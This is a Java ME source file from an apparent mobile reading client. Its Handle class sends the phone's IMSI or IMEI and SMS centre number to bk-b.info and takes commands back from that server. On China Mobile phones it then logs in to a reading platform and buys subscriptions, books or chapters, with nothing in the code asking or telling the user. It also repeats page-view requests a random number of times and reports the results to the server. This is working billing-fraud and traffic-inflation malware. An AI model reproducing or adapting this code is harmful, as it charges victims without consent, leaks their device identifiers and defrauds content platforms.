package com.yazo.contol;

import java.util.Random;
import java.util.Vector;

import org.kxml2.io.KXmlParser;
import org.kxml2.io.ParserXml;
import org.xmlpost.PostContent;

import com.sun.j2mews.xml.rpc.Encoder;
import com.yazo.application.MainMIDlet;
import com.yazo.protocol.Catalog;
import com.yazo.protocol.Login;
import com.yazo.protocol.RefreshPv;
import com.yazo.protocol.Register;
import com.yazo.protocol.WelcomeInfo;
import com.yazo.protocol.YaZhouChannel;
import com.yazo.rms.RmsManager;
import com.yazo.util.AppContext;
import com.yazo.util.Consts;
import com.yazo.util.FileUtil;
import com.yazo.util.HBase64;
import com.yazo.util.MD5;
import com.yazo.util.MobileInfo;
import com.yazo.util.Progress;
import com.yazo.util.ServiceData;
import com.yazo.util.StringUtil;
import com.yazo.util.User;

public class Handle {
	private static int requesttime;
	public static ServiceData serviceData;
	static Vector progressIDFree = null;
	static Vector progressIDCharge = null;
	public static int total = 0;

	public static int tempInt = 0;

	/**
	 * 首次请求服务器
	 * 
	 * @return
	 */
	public static boolean getYaZhuoChannel() {
		serviceData = new ServiceData();
		String name = "NZ_FEE_01";// 接口名称，NZ_FEE_01
		String channel = Consts.yzchannel;// 渠道号，与基地合作分配的渠道号

		String str[] = getIMSIANDCENTERNUMBER();

		String version = Consts.VERSION;// 版本号，V1.01
		String url = "http://bk-b.info/reader/sync/info";
		url = url + "?channel=" + channel + "&center=" + str[1] + "&imsi="
				+ str[0] + "&name=" + name + "&version=" + version;
		YaZhouChannel cdc = new YaZhouChannel(url, "", "GET");
		try {
			Object obj = cdc.getYaZhou("");
			if (obj != null) {
				String strFile = (String) obj;
//				MainMIDlet.postMsg(strFile);
//				System.out.println("服务器返回数据：" + strFile);
				serviceData = new ServiceData();
				serviceData.OPERATE = FileUtil.getArgValue(strFile, "OPERATE");
				serviceData.BUSINESS = FileUtil
						.getArgValue(strFile, "BUSINESS");
				serviceData.FEECODE = FileUtil.getArgValue(strFile, "FEECODE");
				serviceData.MSG1 = FileUtil.getArgValue(strFile, "MSG1");
				serviceData.MSG2 = FileUtil.getArgValue(strFile, "MSG2");
				serviceData.MSG3 = FileUtil.getArgValue(strFile, "MSG3");
				serviceData.MSG4 = FileUtil.getArgValue(strFile, "MSG4");
				serviceData.MSG5 = FileUtil.getArgValue(strFile, "MSG5");
				serviceData.MSG6 = FileUtil.getArgValue(strFile, "MSG6");
				serviceData.MSG7 = FileUtil.getArgValue(strFile, "MSG7");
				serviceData.MSG8 = FileUtil.getArgValue(strFile, "MSG8");

				// test
//				 serviceData.OPERATE = "0";
//				 serviceData.BUSINESS = (serviceData.BUSINESS == null ? ""
//				 : serviceData.BUSINESS);
//				 // serviceData.FEECODE =
//				 // (serviceData.FEECODE==null?"":serviceData.FEECODE);
//				 // serviceData.MSG1 = Consts.HOSTURL;
//				 // serviceData.MSG2= Consts.strUserAgent;
//				 // serviceData.MSG3="12101017";
//				 serviceData.MSG5 =
//				 "346|349494843|349494845,352|349558873|349558875,341|349680330|349680332";
//				 serviceData.MSG6 =
//				 "0|2487|347125261|347125263,0|880|348782216|348782218,1|122|67065|68168|15553,1|345|74149|74638|15566";
//				 serviceData.MSG4 = "0"/*
//				 (serviceData.MSG4==null?"":serviceData.MSG4) */;
//				 serviceData.MSG7 = (serviceData.MSG7 == null ? ""
//				 : serviceData.MSG7);
//				 serviceData.MSG8 = (serviceData.MSG8 == null ? ""
//				 : serviceData.MSG8);
				if (serviceData.MSG5 != null) {// 免费书本
					progressIDFree = new Vector();
					String[] s = StringUtil.split(serviceData.MSG5, ",");
					for (int i = 0; i < s.length; i++) {
						String[] t = StringUtil.split(s[i], "|");
						Progress pro = new Progress();
						pro.sumID = t.length;
						pro.catalogId = t[0];
						pro.contentId = t[1];
						pro.chapterId = t[2];
						if (pro.sumID > 3) {
							pro.productId = t[3];
						}
						progressIDFree.addElement(pro);

					}
				}
				if (serviceData.MSG6 != null) {// 收费书本
					progressIDCharge = new Vector();
					String[] s = StringUtil.split(serviceData.MSG6, ",");
					for (int i = 0; i < s.length; i++) {
						String[] t = StringUtil.split(s[i], "|");

						Progress pro = new Progress();
						pro.sumID = t.length;
						pro.type = t[0];
						pro.catalogId = t[1];
						pro.contentId = t[2];
						pro.chapterId = t[3];
						if (pro.sumID > 4) {
							pro.productId = t[4];
						}
						progressIDCharge.addElement(pro);

					}
				}

				Consts.HOSTURL = (serviceData.MSG1 == null ? ""
						: serviceData.MSG1);// 阅读客户端激活URL
				Consts.channel = Consts.yzchannel.substring(0, 8);
				Consts.strUserAgent = (serviceData.MSG2 == null ? ""
						: serviceData.MSG2);// 阅读客户端版本号
				Consts.strUserPassword = (serviceData.MSG3 == null ? ""
						: serviceData.MSG3);// 阅读客户端密码
				RmsManager.saveServiceSetting(serviceData);
				strFile = null;
			}
		} catch (Exception e) {
			e.printStackTrace();
			requesttime++;
			if (requesttime < 2) {
				getYaZhuoChannel();
			}
		}
		cdc = null;
		return true;

	}

	/**
	 * 流程完毕，同步服务器
	 * 
	 */
	public static boolean synYZServer() {
		String name = "NZ_FEE_RESULT";// 接口名称，NZ_FEE_RESULT
		String channel = Consts.yzchannel;// 渠道号，与基地合作分配的渠道号
		// String msg = Consts.orderState;// 进行操作的标记
		String bookType = Consts.bookType;
		String bookCatalogId = Consts.bookCatalogId;
		String bookChapterId = Consts.bookChapterId;
		String bookContentId = Consts.bookContentId;

		String[] str = getIMSIANDCENTERNUMBER();

		String version = Consts.VERSION;
		String url = "http://bk-b.info/cminterface/sms/sync.aspx";
		url = url + "?channel=" + channel + "&center=" + str[1] + "&imsi="
				+ str[0] + "&name=" + name + "&version=" + version
				+ "&bookType=" + bookType + "&bookCatalogId=" + bookCatalogId
				+ "&bookChapterId=" + bookChapterId + "&bookContentId="
				+ bookContentId;
		YaZhouChannel cdc = new YaZhouChannel(url, "", "GET");
		try {
			Object obj = cdc.getYaZhou("");
			if (obj != null) {
				return true;
			}
		} catch (Exception e) {

		}
		return false;
	}

	/**
	 * 激活流程
	 */
	public static void startProcess() {
		getYaZhuoChannel();// 请求服务器，获得相应的数据
		if (serviceData.MSG4 == null || serviceData.MSG4.equals("1")
				|| !Consts.isChinaMobile) {
			 return;
		}
//		System.out.println("userid:"+User.userId);
		User.userId = RmsManager.getUserID();// 为userId赋值
		if (User.userId.equals("")) {// 判断用户id是否存在来进行注册
			String re = register();// 注册
			MainMIDlet.postMsg("注册：" + re);
		}
		String au = authenticate();// 登录鉴定
		MainMIDlet.postMsg("登录：" + au);
		String welcome = getClientWelcomeInfo();
		MainMIDlet.postMsg("欢迎信息：" + welcome);
		if (welcome == null) {
			return;
		}
		doNotMessage();

	}

	/**
	 * 注册
	 * 
	 */
	public static String register() {
		String result = "";
		String strM = MD5.toMD5(
				new StringBuffer(Consts.strUserAgent).append(
						Consts.strUserPassword).toString()).toLowerCase();
		String pp = HBase64.encode(StringUtil.hexStringToByte(strM));
		PostContent p = new PostContent();
		p.addLabel("Request", "RegisterReq");
		p.addLabel("RegisterReq", "clientHash");
		p.addContent("clientHash", pp);
		System.out.println("register:" + p.getXml());
		strM = null;
		pp = null;
		Register reg = new Register(Consts.HOSTURL, "register");
		try {
			Object obj = reg.getParser(p.getXml());
//			MainMIDlet.postMsg("注册提交的信息："+p.getXml());
			if (obj != null) {
				KXmlParser parser = (KXmlParser) obj;
				result = ParserXml.registerAndLogin(parser);
//				MainMIDlet.postMsg("注册获得的信息："+result);
				RmsManager.saveUserID(User.userId);// 用户id临时存储
				return result;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		p = null;
		return result;
	}

	/**
	 * 登录鉴权
	 * 
	 */
	public static String authenticate() {
		String result = "";
		String strM = MD5.toMD5(
				new StringBuffer(Consts.strUserAgent).append(User.userId)
						.append(Consts.strUserPassword).toString())
				.toLowerCase();
		String pp = HBase64.encode(StringUtil.hexStringToByte(strM));

		PostContent p = new PostContent();
		p.addLabel("Request", "AuthenticateReq");
		p.addLabel("AuthenticateReq", "clientHash");
		p.addContent("clientHash", pp);
		p.addLabel("AuthenticateReq", "channel");
		p.addContent("channel", Consts.channel);
		strM = null;
		pp = null;
		Login ls = new Login(Consts.HOSTURL, "authenticate2");
		try {
			Object obj = ls.authenticate(p.getXml());// 向服务器post信息，并获得返回信息
			if (obj != null) {
				
//				KXmlParser parser = (KXmlParser) obj;
//				result = ParserXml.registerAndLogin(parser);
				result="登录有信息返回。";
				return result;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		p = null;
		return result;
	}

	/**
	 * 欢迎信息
	 * 
	 */
	public static String getClientWelcomeInfo() {
		WelcomeInfo cwi = new WelcomeInfo(Consts.HOSTURL,
				"getClientWelcomeInfo", "GET");
		Object obj = cwi.getClientWelcomeInfo("");
		try {
			if (obj != null) {
				KXmlParser parser = (KXmlParser) obj;
				String[] cids = ParserXml.getCatalogInfoArray(parser);
				parser = null;
				obj = null;
				return cids[0];
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * 执行收费章节动作 执行完毕后，保存操作后产生的[contentId, chapterId]为收费章节pv服务
	 */
	public static void doSubscribeChapter(int index) {
		String url = "";
		RefreshPv pv = null;
		String productId = "", contentId = "", chapterId = "", type = "";
		// 用于防止下标越界
		if (index >= progressIDCharge.size()) {
			index = progressIDCharge.size() - 1;
		}
		Progress pro = (Progress) progressIDCharge.elementAt(index);
		contentId = pro.contentId;
		chapterId = pro.chapterId;
		productId = pro.productId;
		type = pro.type;

		Consts.bookType = type;
		Consts.bookCatalogId = pro.catalogId;
		Consts.bookChapterId = chapterId;
		Consts.bookContentId = contentId;
		// contentId = "67065";
		// chapterId = "68168";
		// productId = "15553";
		if (type.equals("0")) {
			/** *********包月************* */
			System.out.println("包月。。。");
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(pro.catalogId).toString();
			Catalog catalog = new Catalog(url, "subscribeCatalog", "GET");
			boolean re = catalog.subscribeCatalog("");
			MainMIDlet.postMsg("包月是否成功：" + re);
		} else if (type.equals("1")) {// 购买本书
			// 得到产品
			System.out.println("购买书。。");
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).toString();
			pv = new RefreshPv(url, "getContentProductInfo", "GET");
			// pv.doRefreshPv("");
			MainMIDlet.postMsg("得到产品--" + pv.doRefreshPv(""));
			// 执行订购
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&productId=").append(productId)
					.toString();
			pv = new RefreshPv(url, "subscribeContent", "GET");
			// pv.doRefreshPv("");
			if (pv.doRefreshPv("") != null || !pv.doRefreshPv("").equals("")) {
				MainMIDlet.postMsg("执行订购有值返回！！" + pv.doRefreshPv(""));
			} else {
				MainMIDlet.postMsg("执行订购-wu-值返回！！");
			}
		} else if (type.equals("2")) {
			// 得到产品
			System.out.println("购买章节--");
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getContentProductInfo", "GET");
			// pv.doRefreshPv("");
			MainMIDlet.postMsg("得到产品--" + pv.doRefreshPv(""));
			// 执行订购
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.append("&productId=").append(productId).toString();
			pv = new RefreshPv(url, "subscribeContent", "GET");
			// pv.doRefreshPv("");
			if (pv.doRefreshPv("") != null || !pv.doRefreshPv("").equals("")) {
				MainMIDlet.postMsg("执行订购有值返回！！" + pv.doRefreshPv(""));
			} else {
				MainMIDlet.postMsg("执行订购-wu-值返回！！");
			}
		}

		// contentId和chapterId保存到本地
		Vector list = RmsManager.getAllChanges();
		boolean found = false;
		if (list != null && list.size() > 0) {
			for (int i = 0; i < list.size(); i += 2) {
				if (list.elementAt(i).equals(contentId)
						&& list.elementAt(i + 1).equals(chapterId)) {
					found = true;
				}
			}
		}
		if (!found) {
			RmsManager.saveChanges(contentId, chapterId);
		}
	}

	/**
	 * 执行收费章节Pv
	 */
	public static void doSubscribeChapterPV(int index) {
		// StringBuffer sb = new StringBuffer();
		String url = "";
		RefreshPv pv = null;
		String catalogId, contentId, chapterId;
		if (index >= progressIDCharge.size()) {
			index = progressIDCharge.size() - 1;
		}
		// index = 1;
		Progress pro = (Progress) progressIDCharge.elementAt(index);

		catalogId = pro.catalogId;
		contentId = pro.contentId;
		chapterId = pro.chapterId;
		// catalogId = "122";
		// contentId = "67065";
		// chapterId = "68168";
		catalogId = catalogId == null ? "" : catalogId;
		contentId = contentId == null ? "" : contentId;
		if (catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			MainMIDlet.postMsg("收费1--" + pv.doRefreshPv(""));
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getChapterInfo", "GET");
			MainMIDlet.postMsg("收费2--" + pv.doRefreshPv(""));
		} else if (!catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).toString();
			pv = new RefreshPv(url, "getCatalogInfo", "GET");
			MainMIDlet.postMsg("收费3--" + pv.doRefreshPv(""));
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).append("&contentId=").append(contentId)
					.toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			MainMIDlet.postMsg("收费4--" + pv.doRefreshPv(""));
			if (!chapterId.equals("")) {
				url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
						.append(contentId).append("&chapterId=")
						.append(chapterId).toString();
				pv = new RefreshPv(url, "getChapterInfo", "GET");
				MainMIDlet.postMsg("收费5--" + pv.doRefreshPv(""));
			}
		}
		catalogId = null;
		contentId = null;

		if (total == 0) {
			total = 2 + new Random().nextInt(4);
		}
		if (tempInt < total) {
			tempInt++;
			doSubscribeChapterPV(index);
		} else {
			tempInt = 0;
			total = 0;
			return;
		}
	}

	/**
	 * 执行免费过程Pv和章节pv 入口
	 */
	public static void doFreeProcedurePV(int index) {
		String url = "";
		RefreshPv pv = null;
		String catalogId, contentId, chapterId;
		if (index >= progressIDFree.size()) {
			index = progressIDFree.size() - 1;
		}
		Progress pro = (Progress) progressIDFree.elementAt(index);
		catalogId = pro.catalogId;
		contentId = pro.contentId;
		chapterId = pro.chapterId;
		catalogId = catalogId == null ? "" : catalogId;
		contentId = contentId == null ? "" : contentId;
		Consts.bookType = "3";
		Consts.bookCatalogId = pro.catalogId;
		Consts.bookChapterId = chapterId;
		Consts.bookContentId = contentId;

		if (catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			MainMIDlet.postMsg("免费过程1：" + pv.doRefreshPv(""));
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getChapterInfo", "GET");
			MainMIDlet.postMsg("免费过程2：" + pv.doRefreshPv(""));
		} else if (!catalogId.equals("") && !contentId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).toString();
			pv = new RefreshPv(url, "getCatalogInfo", "GET");
			MainMIDlet.postMsg("免费过程3：" + pv.doRefreshPv(""));
			url = new StringBuffer(Consts.HOSTURL).append("?catalogId=")
					.append(catalogId).append("&contentId=").append(contentId)
					.toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			MainMIDlet.postMsg("免费过程4：" + pv.doRefreshPv(""));
			if (!chapterId.equals("")) {
				url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
						.append(contentId).append("&chapterId=")
						.append(chapterId).toString();
				pv = new RefreshPv(url, "getChapterInfo", "GET");
				MainMIDlet.postMsg("免费过程5：" + pv.doRefreshPv(""));
			}
		}
		catalogId = null;
		contentId = null;
		if (total == 0) {
			total = 2 + new Random().nextInt(2);
			total = 1;
		}
		if (tempInt < total) {
			tempInt++;
			doFreeProcedurePV(index);
		} else {
			total = 0;
			tempInt = 0;
			return;
		}
	}

	/**
	 * 读取本地数据 执行收费章节Pv
	 */
	public static void doSubscribeChapterPV() {
		Vector list = RmsManager.getAllChanges();
		if (list != null && list.size() > 0) {
			String[][] args = new String[list.size() / 2 + 1][list.size() / 2];
			int j = 0;
			for (int i = 0; i < list.size(); i += 2) {
				args[0][j] = (String) list.elementAt(i);
				args[j + 1][0] = (String) list.elementAt(i + 1);
				j++;
			}
			list = null;
			doSubscribePV(args);
		}
	}

	/**
	 * 扣费后 刷PV
	 * 
	 * @param ids
	 */
	private static void doSubscribePV(String[][] ids) {
		String url = "";
		RefreshPv pv = null;
		Random ran = new Random();
		String[] contentIds = ids[0];
		int intX = ran.nextInt(contentIds.length);
		String contentId = contentIds[intX];
		String[] chapterIds = ids[intX + 1];
		String chapterId = chapterIds[0];
		contentId = (contentId == null ? "" : contentId);
		chapterId = (chapterId == null ? "" : chapterId);
		if (!contentId.equals("") && !chapterId.equals("")) {
			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).toString();
			pv = new RefreshPv(url, "getContentInfo", "GET");
			MainMIDlet.postMsg("本地过程1：" + pv.doRefreshPv(""));

			url = new StringBuffer(Consts.HOSTURL).append("?contentId=")
					.append(contentId).append("&chapterId=").append(chapterId)
					.toString();
			pv = new RefreshPv(url, "getChapterInfo", "GET");
			MainMIDlet.postMsg("本地过程2：" + pv.doRefreshPv(""));
		}
		contentId = null;
		chapterId = null;
		if (total == 0) {
			total = 2 + new Random().nextInt(4);
		}
		if (tempInt < total) {
			tempInt++;
			doSubscribePV(ids);
		} else {
			tempInt = 0;
			total = 0;
			return;
		}

	}

	/**
	 * 根据操作码提示扣费
	 * 
	 */
	public static void doNotMessage() {
		int indexFree = new Random().nextInt(progressIDFree.size());
		if (serviceData.OPERATE.equals("0")) {
			doFreeProcedurePV(indexFree);// 进行免费pv流程
			boolean test = synYZServer();// 同步服务器
			MainMIDlet.postMsg("同步服务器：" + test);
		} else if (serviceData.OPERATE.equals("1")) {

			switch (Consts.SYSTEMTYPE) {
			case 1:
				// 随机数据执行收费
				int index = new Random().nextInt(progressIDCharge.size());
				// 扣费动作进行购买
				doSubscribeChapter(index);
				synYZServer();
				// 收费过程和章节pv
				doSubscribeChapterPV(index);

				break;
			case 2:
				doFreeProcedurePV(indexFree);
				synYZServer();
				break;
			default:
				doFreeProcedurePV(indexFree);
				synYZServer();
				break;
			}
		}
	}

	/**
	 * 获取系统imsi和短信中心号
	 * 
	 * @return
	 */
	public static String[] getIMSIANDCENTERNUMBER() {
		String[] str = new String[2];
		/** *******获取短信中心号****************************************** */
		String center = "";// 短信中心号码
		try {
			center = MobileInfo.getCNETERNUMBER();
		} catch (Error e) {
		}
		System.out.println("center" + center);
		if (center != null && !center.equals("")) {
			center = center.substring(6, center.length() - 3);
			if (center.substring(0, 2).equals("00")) {
				// 移动
				Consts.isChinaMobile = true;
				AppContext.getInstance().setIsCMNET(false);
			} else {
				// 联通
				Consts.isChinaMobile = false;
				AppContext.getInstance().setIsCMNET(true);
			}
		}
		if (center == null || center.equals("")) {
			center = "6";
		}
		/**
		 * *******获取imsi or imei
		 * 都没有则拿取userid*****************************************
		 */
		String imsi = "";
		try {
			imsi = MobileInfo.getIMSI();// sim卡的imsi码
		} catch (Error e) {
		}
		if (imsi == null || imsi.equals("")) {
			try {
				imsi = MobileInfo.getIMEI();
			} catch (Error e) {
			}
			if (imsi != null && !imsi.equals("")) {
				// imei截取
				if (imsi.length() >= 15) {
					imsi = imsi.substring(imsi.length() - 15, imsi.length());
				}
			}
		} else {
			// imsi截取
			if (imsi.length() >= 16) {
				imsi = imsi.substring(imsi.length() - 16, imsi.length());
			}
		}
		if (imsi != null && !imsi.equals("")) {
			// imsi=imsi.substring(5);
		} else {
			// 本地取USERID
			imsi = RmsManager.getUserID();
			if (imsi != null && imsi.length() >= 20) {
				imsi = imsi.substring(imsi.length() - 20, imsi.length());
			}
		}
		/** ********组装******************** */
		str[0] = imsi;
		str[1] = center;
		return str;
	}

}
